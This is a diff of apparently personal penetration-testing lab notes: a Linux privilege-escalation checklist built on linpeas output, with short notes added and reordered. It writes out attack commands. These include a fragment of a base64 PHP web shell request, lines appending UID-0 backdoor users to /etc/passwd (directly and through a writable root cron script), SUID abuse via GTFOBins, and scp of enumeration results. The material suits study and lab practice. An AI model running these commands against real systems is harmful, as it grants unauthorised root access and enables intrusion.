@@ -980,14 +980,13 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     scp -P 2222 student@192.168.196.52:/home/student/linpeas_output.txt /home/kali/share/results/ #non standard port
     ```
   - Analyze red/yellow font
-    - `grep -E "WARNING|CRITICAL|SUID|password|sudo" linpeas.txt`
     - `grep --color=always -i "sudo" linpeas.txt` (sudo, suid, capabilities, cron, password, writeable, service, ssh, kernel)
-    - SUID - Check easy privesc, exploits and write perms (E.g /usr/bin/find).
+    - ❗**SUID - Check easy privesc, exploits and write perms**
       - `/usr/bin/find` > Exploit with GTFOBins
+    - ❗**Interesting writable files**
+      - `/etc/passwd` `/etc/sudoers.d/` > Modify /etc/passwd to create a root shell > `echo 'malicioususer:x:0:0::/root:/bin/bash' >> /etc/passwd su malicioususer`  
     - Check for vulnerable cron jobs
       - `-rwxrwxrwx 1 root root 1234 /etc/cron.d/backup.sh` > edit the writable backup.sh > `echo 'root::0:0::/root:/bin/bash' >> /etc/passwd`  
-    - Interesting writable files
-      - `/etc/passwd` `/etc/sudoers.d/` > Modify /etc/passwd to create a root shell > `echo 'malicioususer:x:0:0::/root:/bin/bash' >> /etc/passwd su malicioususer`  
     - Checking all env variables
       - `AWS_SECRET_KEY=EXAMPLEDATA12345` > aws configure
     - Kernel Exploits > research and download a matching exploit > compile and execute
